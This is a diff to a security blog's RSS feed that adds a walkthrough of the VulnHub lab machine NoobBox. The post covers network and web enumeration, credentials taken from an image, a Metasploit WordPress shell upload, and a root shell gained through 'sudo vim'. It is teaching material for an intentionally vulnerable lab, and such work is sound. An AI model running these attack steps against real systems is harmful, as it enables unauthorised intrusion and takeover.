@@ -6,7 +6,172 @@
     <description>Recent content in Posts on Impulsive Strikers | Cyber Security Learning</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 29 Sep 2021 12:04:29 +0530</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 05 Oct 2021 21:38:19 +0530</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>N00BBox</title>
+      <link>/posts/vulnhub/noobbox/</link>
+      <pubDate>Tue, 05 Oct 2021 21:38:19 +0530</pubDate>
+      
+      <guid>/posts/vulnhub/noobbox/</guid>
+      <description>NoobBox Vulnhub Link
+Discover User netdiscover to scan the local network for machine
+netdiscover -i eth0 ![/static/img/vulnhub/noobbox/Pasted image 20211004231834.png]
+ netdiscover is used to inspect your network&amp;rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks. -i flag is used to specify the network interface, in this case eth0. Found IP of NoobBox: 192.168.1.9  Enumeration Nmap  Scan using nmap to discover open ports and services on the machine  nmap -sC -sV -v -oN common-ports.</description>
+      <content>&lt;h1 id=&#34;noobbox&#34;&gt;NoobBox&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/noobbox-1,664/&#34;&gt;Vulnhub Link&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;discover&#34;&gt;Discover&lt;/h2&gt;
+&lt;p&gt;User netdiscover to scan the local network for machine&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netdiscover -i eth0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![/static/img/vulnhub/noobbox/Pasted image 20211004231834.png]&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;netdiscover is used to inspect your network&amp;rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-i&lt;/code&gt; flag is used to specify the network interface, in this case eth0.&lt;/li&gt;
+&lt;li&gt;Found IP of NoobBox: &lt;code&gt;192.168.1.9&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;h3 id=&#34;nmap&#34;&gt;Nmap&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Scan using nmap to discover open ports and services on the machine&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt; flag is used to run default nmap scripts&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt; flag is used to enumerate service versions&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; flag is used for verbose output&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-oN&lt;/code&gt; flag is used to output the result in nmap format to a file, in this file is named common-ports.nmap.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Result&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.92 scan initiated Mon Oct  4 22:07:03 2021 as: nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.1.9
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.035s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;999&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;conn-refused&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-title: Apache2 Debian Default Page: It works
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;enumerate-the-website&#34;&gt;Enumerate the Website&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Open the site on the browser, we get the default Apache webserver page
+![[Pasted image 20211004233047.png]]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;We can run gobuster to enumerate the website further for directories.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o initial.gobuster
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211004233655.png]]&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;We can see that &lt;em&gt;&lt;strong&gt;/wordpress&lt;/strong&gt;&lt;/em&gt; is accessible.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;On navigating to the wordpress page, we see that the site is borked due to incorrect url mapping as shown below.
+![[Pasted image 20211004234031.png]]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;On the page source we can see the borked urls as highlighted. The mentioned IP is not reachable from our end as it doesn&amp;rsquo;t exist.
+![[Pasted image 20211004234140.png]]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;We see that in the wordpress page, there is a post, on navigating to the post, we are redirected to the unreachable url.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;We can edit the url to point to our machine ip to access page.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;In the page, we can see the post is created by &amp;ldquo;noobbox&amp;rdquo; user. This could be a username that we can try to access.
+![[Pasted image 20211004234845.png]]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Possible user found: &lt;code&gt;noobbox&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;further-enumeration&#34;&gt;Further Enumeration&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;We can use gobuster again on the wordpress page to further enumerate the wordpress site with file extensions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o wordpress.gobuster -x php,html,png,jpg,jpeg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;We do not find anything useful here, we continue with enumeration.
+![[Pasted image 20211004235238.png]]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Next, we emumerate the base apache site for files using gobuster with file extensions&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,png,jpg,jpeg -o files.gobuster
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211004235637.png]]&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;We get a lot of default apache files along with few files in the base directory with forbidden status (status code 403).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The files that are accessible are img.jpg and index.html (status code 200).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;On accessing the img.jpg url, we get an image with characters, possibly a password?&amp;hellip;
+![[Pasted image 20211005000038.png]] 
+Image is blurred intentionally for the writeup purpose.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Possible credentials - &lt;code&gt;noobbox:[Redacted]&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;gaining-access&#34;&gt;Gaining Access&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;We cannot ssh into the box with the found credentials since ssh port is closed.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Since this is a wordpress site and we have the credentials we can try using metaspoilt to get a revershell.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Fire up metaspolit with &lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Search for wordpress shell upload&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;search wp_admin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005001506.png]]&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;use &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#To use the module&lt;/span&gt;
+show options &lt;span style=&#34;color:#75715e&#34;&gt;#To show the options that need to set (Required options)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005001819.png]]&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We need to set the RHOSTS, TARGETURI, Username &amp;amp; Password&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;set RHOSTS 192.168.1.9
+set TARGET /wordpress/
+set USERNAME noobbox
+set PASSWORD &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Redacted&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Password redacted for writeup purpose.&lt;/span&gt;
+run &lt;span style=&#34;color:#75715e&#34;&gt;#To run the exploit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Once get the meterpreter shell, we can switch to a tty shell if preferred and get the user flag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+ls -la
+cat user.txt &lt;span style=&#34;color:#75715e&#34;&gt;# Read permission for all users&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005211559.png]]&lt;/p&gt;
+&lt;h2 id=&#34;priviledge-escalation&#34;&gt;Priviledge Escalation&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;We can use sudo command to check if we can run any binaries&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -l
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;We see that we can run vim application as a root user.&lt;/li&gt;
+&lt;li&gt;We can check GTFObins for vim privesc routes&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo vim -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:!/bin/bash&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Get the root shell after providing noobbox&amp;#39;s pwd.&lt;/span&gt;
+whoami &lt;span style=&#34;color:#75715e&#34;&gt;#root&lt;/span&gt;
+cat /root.txt &lt;span style=&#34;color:#75715e&#34;&gt;# get the root flag&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005212725.png]]&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Vulnuniversity</title>
       <link>/posts/thm/vulnuniversity/</link>
